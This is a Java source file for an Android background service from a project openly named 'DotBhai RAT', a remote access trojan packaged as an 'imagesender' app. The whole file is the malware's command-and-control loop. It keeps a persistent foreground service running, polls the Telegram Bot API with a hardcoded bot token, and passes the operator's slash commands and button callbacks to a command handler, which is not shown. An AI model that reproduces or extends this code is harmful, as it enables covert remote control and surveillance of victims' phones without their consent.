package com.dotbhai.imagesender;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import okhttp3.*;

public class BotCommandService extends Service {

    private static final String BASE = "https://api.telegram.org/bot" + TelegramSender.BOT_TOKEN;
    private volatile boolean running = true;
    private long lastUpdate = 0;
    private CommandHandler handler;

    @Override
    public void onCreate() {
        super.onCreate();
        
        try {
            String CHANNEL_ID = "bot_channel";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel serviceChannel = new NotificationChannel(
                        CHANNEL_ID, "Bot Service Channel", NotificationManager.IMPORTANCE_LOW);
                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) manager.createNotificationChannel(serviceChannel);
            }
            
            Notification.Builder builder;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                builder = new Notification.Builder(this, CHANNEL_ID);
            } else {
                builder = new Notification.Builder(this);
            }
            
            Notification notification = builder
                    .setContentTitle("DotBhai RAT")
                    .setContentText("البوت شغال في الخلفية...")
                    .setSmallIcon(android.R.drawable.ic_menu_manage)
                    .build();
                    
            startForeground(1, notification);
        } catch (Exception e) {
            Log.e("BotSvc", "Notification error: " + e.getMessage());
        }

        handler = new CommandHandler(this);
        new Thread(this::pollLoop).start();
    }

    private void pollLoop() {
        while (running) {
            try {
                HttpUrl url = HttpUrl.parse(BASE + "/getUpdates").newBuilder()
                        .addQueryParameter("offset", String.valueOf(lastUpdate + 1))
                        .addQueryParameter("timeout", "25")
                        .build();
                Request req = new Request.Builder().url(url).get().build();
                Response resp = TelegramSender.client.newCall(req).execute();
                if (!resp.isSuccessful()) { resp.close(); Thread.sleep(3000); continue; }
                String body = resp.body().string();
                resp.close();

                JSONObject root = new JSONObject(body);
                JSONArray updates = root.optJSONArray("result");
                if (updates == null) continue;

                for (int i = 0; i < updates.length(); i++) {
                    JSONObject u = updates.getJSONObject(i);
                    lastUpdate = u.optLong("update_id");

                    JSONObject msg = u.optJSONObject("message");
                    if (msg != null) {
                        String text = msg.optString("text", "");
                        if (text.startsWith("/start") || text.startsWith("/menu")) {
                            TelegramSender.sendMessageWithButtons(
                                    "🤖 <b>DotBhai RAT</b>\nاختر:",
                                    CommandHandler.mainMenu());
                        } else if (text.startsWith("/")) {
                            handler.execute(text, null);
                        }
                    }

                    JSONObject cb = u.optJSONObject("callback_query");
                    if (cb != null) {
                        handler.execute(cb.optString("data"), cb.optString("id"));
                    }
                }
            } catch (Exception e) {
                Log.e("BotSvc", "poll: " + e.getMessage());
                try { Thread.sleep(3000); } catch (Exception ignored) {}
            }
        }
    }

    @Override public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
    @Override public void onDestroy() { running = false; super.onDestroy(); }
}